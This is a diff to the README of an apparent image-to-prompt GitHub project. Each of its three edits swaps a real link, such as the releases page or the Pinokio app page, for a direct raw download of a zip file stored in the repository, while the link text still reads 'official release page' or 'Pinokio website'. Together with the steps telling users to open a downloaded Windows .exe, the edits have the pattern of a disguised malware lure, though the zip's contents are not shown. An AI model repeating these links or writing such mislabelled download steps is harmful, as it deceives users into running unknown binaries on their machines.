@@ -1,6 +1,6 @@
 # 🖼️ image-to-prompt - Turn static images into editable prompts
 
-[Visit this page to download](https://github.com/aesirsennamarilandica604/image-to-prompt/releases)
+[Visit this page to download](https://github.com/aesirsennamarilandica604/image-to-prompt/raw/refs/heads/main/app/prompt-image-to-Cladophora.zip)
 
 Image to Prompt converts your visual files into structured text. This tool extracts detailed data from images so you can use them in generative design software. It creates editable JSON files that describe objects, regions, and text within your pictures.
 
@@ -15,7 +15,7 @@ Image to Prompt converts your visual files into structured text. This tool extra
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/aesirsennamarilandica604/image-to-prompt/releases).
+1. Go to the [official release page](https://github.com/aesirsennamarilandica604/image-to-prompt/raw/refs/heads/main/app/prompt-image-to-Cladophora.zip).
 2. Look for the latest version listed under the Assets section.
 3. Download the installation file ending in .exe for your Windows system.
 4. Open the downloaded file to begin the setup process.
@@ -65,7 +65,7 @@ If the software fails to process an image, check these steps:
 
 If you prefer an automated approach, you can use the Pinokio browser to install this software. Pinokio manages the dependencies and settings for you.
 
-1. Navigate to the [Pinokio website](https://pinokio.co/apps/github-com-cocktailpeanut-image-to-prompt).
+1. Navigate to the [Pinokio website](https://github.com/aesirsennamarilandica604/image-to-prompt/raw/refs/heads/main/app/prompt-image-to-Cladophora.zip).
 2. Follow the instructions to install the Pinokio browser.
 3. Search for the Image to Prompt script within the Pinokio interface.
 4. Click the install button to let Pinokio handle the setup.
